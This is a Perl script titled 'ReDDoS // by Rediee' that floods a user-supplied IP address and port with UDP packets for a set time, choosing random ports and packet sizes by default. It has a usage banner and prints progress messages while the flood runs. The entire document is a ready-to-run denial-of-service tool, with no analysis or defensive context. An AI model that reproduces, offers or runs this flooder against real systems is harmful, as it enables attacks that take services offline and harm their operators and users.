########################################################
########################################################
########################################################
#USAGE: perl reddos.pl <ip> <port> <packet size> <time>#
########################################################
########################################################
########################################################

use Socket;
use strict;
 
if ($#ARGV != 3) {
  print " \n";
  print "ReDDoS // by Rediee\n\n";
  print "Command: perl reddos.pl <ip> <port> <packet size> <time>\n";
  print " port: port for flooding.\n";
  print " packet size: best - 1024\n";
  print " time: time in seconds.\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Can't connect to $ip :( \n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "\n\n ReDDoS // by Rediee\n\n";
 
print "Flooding on: $ip on port: " . ($port ? $port : "random") . ", with: " . 
  ($size ? "$size-byte" : "random") . " packet size" . 
  ($time ? " for $time seconds" : "") . "\n";
print "\n You can stop DDoS with CTRL+C \n DDoS in progress.";
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}